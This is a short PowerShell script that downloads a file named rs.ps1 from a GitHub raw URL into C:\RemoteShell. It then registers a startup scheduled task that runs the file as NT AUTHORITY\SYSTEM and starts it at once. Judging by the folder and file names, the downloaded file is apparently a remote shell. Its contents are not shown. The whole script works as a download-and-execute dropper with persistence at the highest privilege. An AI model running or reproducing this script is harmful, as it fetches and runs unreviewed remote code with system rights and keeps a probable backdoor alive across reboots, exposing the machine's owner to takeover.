$url='https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1'
$ziel='C:\RemoteShell\rs.ps1'
$w=New-Object Net.WebClient;if(!(Test-Path 'C:\RemoteShell')){md 'C:\RemoteShell'};$w.DownloadFile($url,$ziel)

Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

Start-ScheduledTask -TaskName "rs"
